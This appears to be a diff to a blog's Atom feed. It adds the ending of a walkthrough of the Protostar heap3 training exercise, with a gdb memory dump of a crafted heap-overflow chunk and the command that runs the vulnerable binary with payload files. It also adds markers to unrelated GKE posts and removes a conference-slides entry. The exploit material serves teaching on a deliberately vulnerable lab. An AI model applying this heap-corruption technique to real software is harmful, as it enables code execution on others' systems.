+</span><span class='line'><span class="mh">0x804c020</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000029</span>
+</span><span class='line'><span class="mh">0x804c030</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c040</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>  <span class="mh">0x42424242</span>
+</span><span class='line'><span class="mh">0x804c050</span><span class="o">:</span> <span class="mh">0x42424242</span>  <span class="mh">0x00000061</span>  <span class="mh">0x0804b194</span>  <span class="mh">0x0804b194</span>
+</span><span class='line'><span class="mh">0x804c060</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c070</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c080</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c090</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0a0</span><span class="o">:</span> <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>  <span class="mh">0x43434343</span>
+</span><span class='line'><span class="mh">0x804c0b0</span><span class="o">:</span> <span class="mh">0x00000060</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0x0804b11c</span>
+</span><span class='line'><span class="mh">0x804c0c0</span><span class="o">:</span> <span class="mh">0x0804c014</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x804c0d0</span><span class="o">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
+</span><span class='line'><span class="mh">0x0804c01b</span> <span class="n">in</span> <span class="o">??</span> <span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now let&rsquo;s run it without gdb.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">user</span><span class="err">@</span><span class="nl">protostar</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="p">.</span><span class="o">/</span><span class="n">heap3</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">A</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">B</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">C</span><span class="p">)</span>
+</span><span class='line'><span class="n">that</span> <span class="n">wasn</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="mi">1587443061</span>
+</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Amazing.</p>
+
+<h3>References</h3>
+
+<ul>
+<li><a href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26">https://www.youtube.com/watch?v=HWhzH&#8211;89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=26</a></li>
+<li><a href="https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6">https://medium.com/@c0ngwang/the-art-of-exploiting-heap-overflow-part-6-14410c9ba6a6</a></li>
+</ul>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[How to Expose a Localhost-only Endpoint on GKE]]></title>
@@ -35,6 +1316,9 @@ interface. <strong>So how can we expose these metrics, i.e. make the HTTP endpoi
 <li>If something you need is running on a computer you control, you can always find a way extract info
 from it if you&rsquo;re resourceful enough.</li>
 </ul>
+
+
+<!-- more -->
 
 
 <h2>My specific GKE cluster configuration</h2>
@@ -626,6 +1910,9 @@ vendor-managed services.</p>
 <li>always load test new features above and beyond what you expect your production load will be</li>
 <li>use proper load testing tools and not bash for loops</li>
 </ul>
+
+
+<!-- more -->
 
 
 <h2>My specific GKE cluster configuration</h2>
@@ -2521,32 +3808,6 @@ I know because I drank half of it.</li>
 
 
 
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[My QCon NYC 2016 Slides - Reach Production Faster With Containers in Testing]]></title>
-    <link href="https://www.davidxia.com/2016/06/my-qcon-nyc-2016-slides/"/>
-    <updated>2016-06-20T17:15:49-04:00</updated>
-    <id>https://www.davidxia.com/2016/06/my-qcon-nyc-2016-slides</id>
-    <content type="html"><![CDATA[<p>Here are the slides from my <a href="https://qconnewyork.com/ny2016/presentation/reaching-production-faster-with-containers-in-testing">QCon NYC 2016 talk titled &ldquo;Reach Production Faster with Containers in
-Testing.&rdquo;</a> in various formats. <span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">All formats of &ldquo;Reach Production Faster with Containers in Testing&rdquo;</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://www.davidxia.com/2016/06/my-qcon-nyc-2016-slides-reach-production-faster-with-containers-in-testing/" property="cc:attributionName" rel="cc:attributionURL">David Xia</a> are licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.</p>
-
-<iframe src="//www.slideshare.net/slideshow/embed_code/key/p1uEfRmocwplbk" width="595" height="485" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>
-
-
-<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/DavidXia/qcon-nyc-2016-reach-production-faster-with-containers-in-testing" title="QCon NYC 2016: Reach Production Faster with Containers in Testing" target="_blank">QCon NYC 2016: Reach Production Faster with Containers in Testing</a> </strong> from <strong><a href="//www.slideshare.net/DavidXia" target="_blank">David Xia</a></strong> </div></p>
-
-<p>More formats here:</p>
-
-<ul>
-<li><a href="https://drive.google.com/file/d/0By_v8MtsRMKkSloyT3gxalRuYjQ/view?usp=sharing">PDF</a></li>
-<li><a href="https://drive.google.com/file/d/0By_v8MtsRMKkSm9BVW5uWFR5TFk/view?usp=sharing">Keynote</a></li>
-<li><a href="https://drive.google.com/file/d/0By_v8MtsRMKkRkpQWk5paUZOUW8/view?usp=sharing">PowerPoint</a></li>
-</ul>
-
-
-<p><img class="center" src="https://i.imgur.com/w0P47Ugl.jpg" width="640" height="619"></p>
 ]]></content>
   </entry>
   
